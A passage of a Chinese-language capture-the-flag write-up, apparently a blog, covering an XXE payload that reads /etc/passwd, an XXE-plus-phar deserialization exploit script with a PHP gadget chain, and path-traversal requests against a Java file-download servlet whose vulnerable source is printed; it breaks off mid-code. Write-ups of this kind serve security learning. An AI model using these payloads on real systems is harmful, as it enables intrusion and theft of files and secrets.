class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">condition</span> <span class="hljs-string">&#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;eval;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;error;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">&#x27;</span>&gt;</span></span><br><span class="hljs-meta">    %condition;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>any text<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="xxePhar"><a href="#xxePhar" class="headerlink" title="xxePhar"></a>xxePhar</h3><p>弱口令<code>admin/admin</code>登录，会跳转到一个文件上传的点。可以先使用<code>XXE</code>逐一读取<code>doLogin.php</code>和<code>class.php</code>的文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#doLogin.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* autor: c0ny1</span><br><span class="hljs-comment">* date: 2018-2-7</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><span class="hljs-variable">$USERNAME</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <span class="hljs-comment">//账号</span><br><span class="hljs-variable">$PASSWORD</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <span class="hljs-comment">//密码</span><br><span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br><span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br><span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">#class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fun</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;call_user_func_array&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func,<span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;FLAG&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;serialize me?&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/Test/&quot;</span>,<span class="hljs-title function_ invoke__">get_class</span>(<span class="hljs-variable">$this</span>-&gt;a)))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No test in Prod\n&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-variable">$p</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造序列化内容，exp如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fun</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;func = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>,<span class="hljs-string">&quot;__call&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$a</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;aaa&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Fun</span>());<br><span class="hljs-variable">$a</span>-&gt;a = <span class="hljs-variable">$b</span>;<br><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>将生成的phar文件上传</p><p>最后利用XXE通过phar协议触发反序列化获得flag。 SYSTEM phar:&#x2F;&#x2F;&#x2F;temp&#x2F;phar.phat</p><h3 id="网鼎杯-FileJava"><a href="#网鼎杯-FileJava" class="headerlink" title="网鼎杯 FileJava"></a>网鼎杯 FileJava</h3><p>可以上传任意文件和下载文件，但是不能访问，所以不能用一句话连接，在下载文件功能发现可以下载任意文件，于是将WEB-INF&#x2F;web.xml页面下载,访问<code>/file_in_java/DownloadServlet?filename=../../../../WEB-INF/web.xml</code>,相关内容如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ListFileServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ListFileServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/ListFileServlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>UploadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>UploadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/UploadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发现有上传和下载的配置文件，由2个类组成，将这2个类进行下载。分别访问&#96;&#x2F;file_in_java&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet</p><p>&#x2F;DownloadServlet.class<code>、</code>&#x2F;file_in_java&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class<code>。使用</code>jd-gui.exe<code>分别进行反编译，其中</code>DownloadServlet.class&#96;源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.abc.servlet;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintStream;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> javax.servlet.RequestDispatcher;<br><span class="hljs-keyword">import</span> javax.servlet.ServletContext;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DownloadServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span><br>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span><br>    <span class="hljs-keyword">throws</span> ServletException, IOException<br>  &#123;<br>    doPost(request, response); &#125;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;filename&quot;</span>);<br>    fileName = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(fileName.getBytes(<span class="hljs-string">&quot;ISO8859-1&quot;</span>), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;filename=&quot;</span> + fileName);<br>    <span class="hljs-keyword">if</span> ((fileName != <span class="hljs-literal">null</span>) &amp;&amp; (fileName.toLowerCase().contains(<span class="hljs-string">&quot;flag&quot;</span>))) &#123;<br>      request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;禁止读取&quot;</span>);<br>      request.getRequestDispatcher(<span class="hljs-string">&quot;/message.jsp&quot;</span>).forward(request, response);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileSaveRootPath</span> <span class="hljs-operator">=</span> getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/upload&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> findFileSavePathByFileName(fileName, fileSaveRootPath);<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>    <span class="hljs-keyword">if</span> (!(file.exists())) &#123;<br>      request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;您要下载的资源已被删除!&quot;</span>);<br>      request.getRequestDispatcher(<span class="hljs-string">&quot;/message.jsp&quot;</span>).forward(request, response);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">realname</span> <span class="hljs-operator">=</span> fileName.substring(fileName.indexOf(<span class="hljs-string">&quot;_&quot;</span>) + <span class="hljs-number">1</span>);<br>    response.setHeader(<span class="hljs-string">&quot;content-disposition&quot;</span>, <span class="hljs-string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(realname, <span class="hljs-string">&quot;UTF-8&quot;</span>));<br>    <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(path + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>    <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>    <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>    <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ((len = in.read(buffer)) &gt; <span class="hljs-number">0</span>)<br>      out.write(buffer, <span class="hljs-number">0</span>, len);<br>    in.close();<br>    out.close();<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">findFileSavePathByFileName</span><span class="hljs-params">(String filename, String saveRootPath)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> filename.hashCode();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">dir1</span> <span class="hljs-operator">=</span> hashCode &amp; <span class="hljs-number">0xF</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">dir2</span> <span class="hljs-operator">=</span> (hashCode &amp; <span class="hljs-number">0xF0</span>) &gt;&gt; <span class="hljs-number">4</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> saveRootPath + <span class="hljs-string">&quot;/&quot;</span> + dir1 + <span class="hljs-string">&quot;/&quot;</span> + dir2;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(dir);<br>    <span class="hljs-keyword">if</span> (!(file.exists()))<br>      file.mkdirs();<br>    <span class="hljs-keyword">return</span> dir;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>UploadServlet.class</code>源码如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span 